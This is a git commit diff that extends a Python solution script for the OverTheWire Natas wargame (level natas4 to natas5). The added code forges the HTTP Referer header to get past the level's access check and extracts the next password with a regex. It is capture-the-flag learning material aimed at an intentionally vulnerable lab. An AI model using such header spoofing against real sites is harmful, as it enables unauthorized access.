2f2cc0d84eada79b2f531d86f71d9365a1108f8c
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-07-27 12:38:44 +1000

    added the guide for natas4 -> natas5

--- natas4/natas4.py
+++ natas4/natas4.py
@@ -13,4 +13,17 @@ AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
 response = requests.get(url=URL, auth=AUTH)
 soup = bs4.BeautifulSoup(response.text, 'html.parser')
 div_content = soup.find('body').find('div', {'id' : 'content'})
-print(div_content)
+print(f'{div_content}\n')
+
+
+# we need to change the referer in the header request
+# as the site only accepts authorised users from
+# http://natas5.natas.labs.overthewire.org/
+response = requests.get(url=URL, auth=AUTH, headers={'referer' : 'http://natas5.natas.labs.overthewire.org/'})
+soup = bs4.BeautifulSoup(response.text, 'html.parser')
+div_content = soup.find('body').find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+
+
+password = re.search(r'is (\w+)\n', str(div_content)).group(1)
+print(f'natas5 password: {password}')
